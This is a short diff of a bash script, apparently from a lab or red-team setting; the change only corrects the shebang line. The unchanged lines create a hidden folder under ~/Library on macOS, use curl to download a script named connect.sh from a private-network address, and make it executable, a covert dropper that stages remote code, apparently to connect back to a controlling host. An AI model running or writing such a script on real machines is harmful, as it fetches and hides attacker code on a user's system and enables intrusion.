@@ -1,4 +1,4 @@
-#/bin/bash
+#!/bin/bash
 mkdir ~/Library/.hidden
 curl http://172.16.64.1:8000/connect.sh > ~/Library/.hidden/connect.sh
 chmod +x ~/Library/.hidden/connect.sh
